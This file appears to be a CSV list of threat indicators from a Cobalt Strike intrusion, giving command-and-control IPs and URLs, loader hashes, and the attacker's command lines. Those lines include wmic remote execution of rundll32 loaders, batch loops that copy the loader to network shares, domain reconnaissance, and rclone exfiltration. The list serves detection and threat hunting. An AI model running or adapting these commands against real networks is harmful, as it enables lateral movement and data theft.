ip,23.106.160.174,Cobalt Strike C2
ip,91.199.212.52,Cobalt Strike C2
url,docns.com/OrderEntryService.asmx/AddOrderLine,Cobalt Strike C2
url,docns.com/us/ky/louisville/312-s-fourth-st.html,Cobalt Strike C2
url_path,us/ky/louisville/312-s-fourth-st.html,Common Cobalt strike URL path: https://twitter.com/1ZRR4H/status/1350803258441392128
url_path,mega.co.nz,Legitimate cloud storage provider commonly used for data exfiltration
url_path,mega.nz,Legitimate cloud storage provider commonly used for data exfiltration
command_line,"rundll32.exe  C:\ProgramData\%.dll, Control_RunDLL",Cobalt Strike loader - doc.dll replaced with % wildcard
command_line,rundll32.exe C:\Programdata\%.dll entryPoint,Cobalt Strike loader - doc.dll and sys.dll seen - replaced with % wildcard
command_line,cmd.exe /C cp.bat,Batch script used for copying XLSX files containing the string "pas" in the filename
command_line,cmd.exe /C C:\ProgramData\nt.bat,batch script executed by the thret actor - unknown content
command_line,cmd.exe /C \\%\c$\programdata\1.bat,IP address replaced with % wildcard - command used to execute unknown batch script on remote computer
command_line,cmd.exe /C wmic /node: % process call create "rundll32.exe C:\Programdata\%.dll entryPoint",IP address and dll filename replaced with % wildcard - command used to deploy cobalt strike loader on remote computer
command_line,cmd.exe /C portscan % 5000-6000 icmp 1024,Multiple IP comma seperated IP ranaged replaced with % wildcard
command_line,ping % -n 1,ping command - computer name replaced with % wildcard
command_line,cmd.exe /C time,command to check computers local time
command_line,cmd.exe /C nltest /DOMAIN_TRUSTS,command to check domain trusts
command_line,cmd.exe /C net group "domain Admins" /domain,command to list domain admins
command_line,cmd.exe /C nltest /dclist:,command to list domain controllers
command_line,rclone.exe  copy % remote:% -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12,Legitiate RClone tool used for exfiltration - source file path of files to copy and destination file path replaced with % wildcards
filename,copy_files_srv.bat,batch script to copy cobalt strike loader to a list of servers ip addresses contained in srv.txt
filename,copy_files_work.bat,batch script to copy cobalt strike loader to a list of endpoints ip addresses contained in work.txt
filename,wm_start.bat,batch script using wmic to launch rundll32 with cobalt strike loader on a list of servers ip addresses contained in srv.txt
filename,wm_start_work.bat,batch script using wmic to launch rundll32 with cobalt strike loader on a list of endpoints ip addresses contained in work.txt
filename,srv.txt,list of server ip addresses on the local network
filename,work.txt,list of endpoint ip addresses on the local network
filename,cp.bat,batch script to copy files that all contain the string "pas" in their filename
sha256,2cd05616874445c655eaf723c549f35cc6c379b1877750788adf2c5d6b86cd09,cobalt strike loader
sha256,1bf119de536f4826ede7b64fbf836fcb838e5cc96d962ed5dbf4c269ac98e9b6,cobalt strike loader
sha256,9b5d1f6a94ce122671a5956b2016e879428c74964174739b68397b6384f6ee8b,RClone (legitimate)
command_line,for /f %%i in (%.txt) do copy "C:\ProgramData\%.dll" \\%%i\c$\ProgramData\%.dll,command from batch script to copy cobalt strike loader - filenames replaced with % wildcard
command_line,for /f %%i in (%.txt) do wmic /node: %%i process call create "rundll32.exe C:\Programdata\%.dll entryPoint",commamd from batch script to use wmic to run cobalt strike loader - filenames replaced with % wildcard
